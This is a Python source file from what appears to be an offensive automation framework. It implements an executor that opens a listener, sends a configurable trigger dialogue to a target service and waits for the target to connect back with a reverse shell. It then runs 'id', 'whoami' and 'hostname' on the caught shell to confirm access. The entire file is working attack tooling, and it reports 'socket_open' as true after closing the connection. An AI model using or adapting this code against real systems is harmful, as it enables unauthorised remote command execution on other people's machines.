import logging
import re
import socket
import time
from typing import Any, Dict, List, Tuple

logger = logging.getLogger("kali-engine.executor.trigger_reverse_shell")


class TriggerReverseShellExecutor:
    """
    Executor for exploits that cause the target to connect back to the attacker.
    Example: HTTP RCE -> reverse shell
    """

    def __init__(
        self,
        host: str,
        service_protocol: str,
        service_port: int,
        dialogue: List[Dict[str, Any]],
        callback_port: int,
        listen_timeout: float = 10.0,
        connect_timeout: float = 2.0,
    ):
        self.host = host
        self.service_protocol = service_protocol
        self.service_port = service_port
        self.dialogue = dialogue
        self.callback_port = callback_port
        self.listen_timeout = listen_timeout
        self.connect_timeout = connect_timeout

    def _open_listener(self) -> socket.socket:
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.settimeout(self.listen_timeout)
        listener.bind(("", self.callback_port))
        listener.listen(1)
        return listener

    def _tcp_connect(self, port: int) -> socket.socket:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(self.connect_timeout)
        sock.connect((self.host, port))
        return sock

    def execute(self) -> Dict[str, Any]:
        try:
            logger.info(
                "[EXECUTOR] trigger_reverse_shell: opening listener on 0.0.0.0:%d",
                self.callback_port,
            )

            # Open listener BEFORE trigger
            listener = self._open_listener()

            logger.info(
                "[EXECUTOR] trigger_reverse_shell: connecting to trigger %s:%d",
                self.host,
                self.service_port,
            )

            # Open trigger channel
            sock = self._tcp_connect(self.service_port)

            # Execute trigger dialogue
            for step in self.dialogue:
                action = step.get("action")
                data = step.get("data", "")
                encoding = step.get("encoding", "ascii")

                if action == "expect":
                    recv_data = sock.recv(4096)
                    logger.debug("[EXECUTOR] expect: %s", data)

                    if not re.search(data.encode(encoding), recv_data):
                        sock.close()
                        listener.close()
                        return self._fail(
                            "PRECONDITION_FAILED",
                            "Expected pattern not found in trigger response",
                        )

                elif action == "send":
                    logger.debug("[EXECUTOR] send: %s", data)
                    sock.sendall(data.encode(encoding) + b"\r\n")

                else:
                    sock.close()
                    listener.close()
                    return self._fail(
                        "EXECUTOR_ERROR",
                        f"Unsupported dialogue action: {action}",
                    )

            # Close trigger channel
            sock.close()

            logger.info(
                "[EXECUTOR] waiting for reverse connection on port %d",
                self.callback_port,
            )

            # Wait for inbound reverse shell
            try:
                conn, addr = listener.accept()
                logger.info(
                    "[EXECUTOR] reverse shell connection from %s:%d",
                    addr[0],
                    addr[1],
                )
                return self._success(conn, addr)

            except socket.timeout:
                return self._fail(
                    "TARGET_FAILURE",
                    "No reverse connection received before timeout",
                )

        except Exception as e:
            logger.exception("[EXECUTOR] trigger_reverse_shell failed")
            return self._fail("EXECUTOR_ERROR", str(e))

    def _success(self, conn: socket.socket, addr: Tuple[str, int]) -> Dict[str, Any]:
        try:
            probe = self._probe_reverse_shell(conn)
        finally:
            conn.close()

        details = (
            f"Reverse shell received from {addr[0]}:{addr[1]}. "
            f"User: {probe.get('whoami', '?')}, "
            f"Host: {probe.get('hostname', '?')}"
        )

        return {
            "status": "SUCCESS",
            "details": details,
            "artifact": {
                "callback_port": self.callback_port,
                "peer": addr,
                "socket_open": True,
                "probe": probe,
            },
        }

    def _fail(self, status: str, reason: str) -> Dict[str, Any]:
        return {
            "status": status,
            "details": reason,
        }

    def _probe_reverse_shell(self, conn: socket.socket) -> Dict[str, str]:
        """
        Send minimal verification commands to a reverse shell.
        Must be non-interactive and bounded.
        """
        probes = ["id", "whoami", "hostname"]
        results = {}

        conn.settimeout(2.0)

        for cmd in probes:
            try:
                conn.sendall(cmd.encode("ascii") + b"\n")
                time.sleep(0.3)
                data = conn.recv(4096)
                results[cmd] = data.decode(errors="ignore").strip()
            except Exception as e:
                results[cmd] = f"<error: {e}>"

        return results
